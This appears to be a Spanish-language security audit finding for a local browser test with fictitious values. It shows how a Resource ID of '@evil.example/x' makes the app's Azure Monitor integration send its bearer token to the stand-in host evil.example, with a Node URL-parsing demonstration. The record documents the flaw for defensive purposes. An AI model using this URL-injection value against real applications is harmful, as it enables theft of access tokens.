# B8 · AUD-FUG-401 / AUD-SEG-500 en navegador (b8.localhost:5173, red falsa B6, valores ficticios)
Ajustes → Modelos → «Acceso a Azure Monitor» → tenant 0000…, client 1111…, secreto `FAKE-SECRET-B8`, Resource ID `@evil.example/x` → «Guardar acceso».
Envoltorio de `fetch` propio (solo host, ruta y tipo/longitud de `Authorization`):
- POST `login.microsoftonline.com /00000000-…/oauth2/v2.0/token` (sin Authorization)
- GET `evil.example /x/providers/microsoft.insights/metrics` con `Authorization: Bearer (len 20)` ← token falso del arnés
UI: «≈ 0 min de 5 h usadas · quedan 5 h», sin aviso. `habla.azureUsage.res = "@evil.example/x"`.
Node: `new URL('https://management.azure.com'+'@evil.example/x'+'/providers/…').host` → `evil.example`; con `.evil.example/x` → `management.azure.com.evil.example`.
